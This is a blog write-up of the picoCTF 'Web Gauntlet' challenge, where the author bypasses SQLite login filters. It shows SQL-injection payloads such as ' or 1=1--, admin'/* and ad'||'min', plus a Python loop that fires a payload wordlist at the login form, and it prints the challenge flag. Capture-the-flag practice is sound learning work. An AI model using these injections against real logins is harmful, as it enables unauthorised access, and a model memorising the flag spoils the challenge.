+++
date = '2026-03-31'
draft = false
title = 'Pico Web Gauntlet Writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Challenge overview

Can you beat the filters? Log in as admin.

---

We need to log in as admin, through SQLi, and we have 5 rounds to beat.

## Identifying the vulnerabilities

First, by submitting a single ' as the password, we get the SQL engine right away, SQLite3.

![challenge-screenshot](sqlite3.png#center)

However, sending the `user=admin` and `pass=' or 1=1--` didn't work send us to the next phase, but returned a 302 page. So I turned to PayloadAllTheThings, and to practice my python skills, wrote this:

```python
import requests

url = "http://shape-facility.picoctf.net:53534"

data = {
    "user":"",
    "pass":"test"
}

#practic iteram printre payloads 
with open('/home/kali/Downloads/Auth_Bypass.txt') as payload:
	for line in payload:
		data = {
		    "user":line,
		    "pass":"test"
		}
		res = requests.post(url, data=data)
		if 'Round 2' in res.text:
		    print(res.text)
		    print(f"this worked for the user {line}")
```

And, we got a hit:

![challenge-screenshot](r1.png#center)

After testing, just `admin"--` was enough for this one, as the `/*` just represents the multiline comment. Weirdly enough, `admin'/*` worked to get us to Round 3 AND Round 4 as well.

While solving this I developed the tool I reference in [this post](irinasusca.github.io/writeup-blog/posts/requests), for pretty printing responses, if you want to go check that out.

I tried solving the last one with sqlmap, and then some other internte payloads, but that didn't work, so I just gave up and looked for the solution online. Apparently the word "admin" was blocked, and it needed to be concatenated. 

So that just meant `ad'||'min';`, for both Round 4 and 5. And the flag was `picoCTF{y0u_m4d3_1t_79a0ddc6}`.
